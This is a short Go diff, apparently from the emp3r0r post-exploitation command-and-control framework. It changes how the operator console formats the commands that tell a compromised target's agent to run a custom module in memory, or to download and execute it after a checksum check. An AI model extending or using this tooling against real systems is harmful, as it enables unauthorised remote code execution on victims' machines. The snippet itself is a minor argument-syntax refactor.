@@ -94,7 +94,7 @@ func moduleCustom() {
 
 		// in-memory module
 		if config.InMemory {
-			cmd := fmt.Sprintf("%s %s %s", emp3r0r_data.C2CmdCustomModule, CurrentMod, "in_mem")
+			cmd := fmt.Sprintf("%s --mod %s --in_mem", emp3r0r_data.C2CmdCustomModule, CurrentMod)
 			cmd_id := uuid.NewString()
 			err = SendCmdToCurrentTarget(cmd, cmd_id)
 			if err != nil {
@@ -119,7 +119,7 @@ func moduleCustom() {
 
 		// tell agent to download and execute this module
 		checksum := tun.SHA256SumFile(tarball)
-		cmd := fmt.Sprintf("%s %s %s", emp3r0r_data.C2CmdCustomModule, CurrentMod, checksum)
+		cmd := fmt.Sprintf("%s --mod_name %s --checksum %s", emp3r0r_data.C2CmdCustomModule, CurrentMod, checksum)
 		cmd_id := uuid.NewString()
 		err = SendCmdToCurrentTarget(cmd, cmd_id)
 		if err != nil {
